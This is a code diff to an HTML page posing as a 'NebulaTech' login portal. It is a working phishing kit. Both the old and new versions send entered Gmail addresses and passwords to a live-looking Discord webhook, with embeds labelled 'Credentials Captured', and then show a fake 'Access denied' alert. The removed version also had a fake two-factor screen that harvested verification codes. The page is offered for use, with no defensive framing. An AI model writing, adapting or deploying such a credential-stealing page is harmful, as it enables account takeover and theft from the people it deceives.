@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>NebulaTech Secure Portal</title>
+  <title>NebulaTech Access</title>
   <style>
     body {
       background-color: #0d0d0d;
@@ -61,50 +61,25 @@
     button:hover {
       background-color: #00aaaa;
     }
-
-    .hidden {
-      display: none;
-    }
   </style>
 </head>
 <body>
-  <div class="login-box" id="loginStage">
-    <h2>NebulaTech Login</h2>
+  <div class="login-box">
+    <h2>NebulaTech Gateway</h2>
     <input type="text" id="email" placeholder="Email (Gmail only)">
     <input type="password" id="password" placeholder="Access Key">
-    <button onclick="handleLogin()">Access System</button>
-  </div>
-
-  <div class="login-box hidden" id="codeStage">
-    <h2>Verification Required</h2>
-    <p style="margin-bottom:10px;">A security code has been sent to your Gmail.</p>
-    <input type="text" id="codeInput" placeholder="Enter 6-digit Code">
-    <button onclick="handleVerification()">Verify</button>
+    <button onclick="submitCredentials()">Access System</button>
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1396126913038123068/WuVgy5nWwXQRum5a1Ye0s2zQElODsb6XpTIeKgbINlc51ZnfD-8kCUTg7a3WBBMrj56e";
+    const webhookURL = "https://discord.com/api/webhooks/1396126913038123068/WuVgy5nWwXQRum5a1Ye0s2zQElODsb6XpTIeKgbINlc51ZnfD-8kCUTg7a3WBBMrj56e
+";
 
     function isValidGmail(email) {
       return /^[a-zA-Z0-9._%+-]{6,}@gmail\.com$/.test(email);
     }
 
-    let capturedEmail = "";
-    let capturedPassword = "";
-
-    async function sendToWebhook(payload) {
-      try {
-        await fetch(webhookURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-      } catch (e) {
-        console.warn("Webhook error:", e);
-      }
-    }
-
-    function handleLogin() {
+    async function submitCredentials() {
       const email = document.getElementById("email").value.trim();
       const password = document.getElementById("password").value;
 
@@ -113,15 +88,11 @@
         return;
       }
 
-      capturedEmail = email;
-      capturedPassword = password;
-
-      // Instantly send the login data
       const payload = {
-        content: "**🔐 Instant Login Snagged**",
+        content: "**🎯 Immediate Credential Hit**",
         embeds: [{
-          title: "🎯 Credentials Captured Instantly",
-          color: 16776960,
+          title: "🔓 Credentials Captured",
+          color: 15277667,
           fields: [
             { name: "Email", value: email },
             { name: "Password", value: password },
@@ -130,35 +101,18 @@
         }]
       };
 
-      sendToWebhook(payload);
+      try {
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        console.warn("Webhook failed:", e);
+      }
 
-      // Now show the fake 2FA screen
-      document.getElementById("loginStage").classList.add("hidden");
-      document.getElementById("codeStage").classList.remove("hidden");
-    }
-
-    function handleVerification() {
-      const code = document.getElementById("codeInput").value;
-
-      const codePayload = {
-        content: "**📲 Verification Code Submitted**",
-        embeds: [{
-          title: "🧬 2FA Stage Entered",
-          color: 11730954,
-          fields: [
-            { name: "Email", value: capturedEmail },
-            { name: "2FA Code", value: code },
-            { name: "Timestamp", value: new Date().toLocaleString() }
-          ]
-        }]
-      };
-
-      sendToWebhook(codePayload);
-
-      setTimeout(() => {
-        alert("Verification failed. Please try again.");
-        location.reload();
-      }, 1000);
+      alert("Access denied. Please check your credentials and try again.");
+      location.reload();
     }
   </script>
 </body>
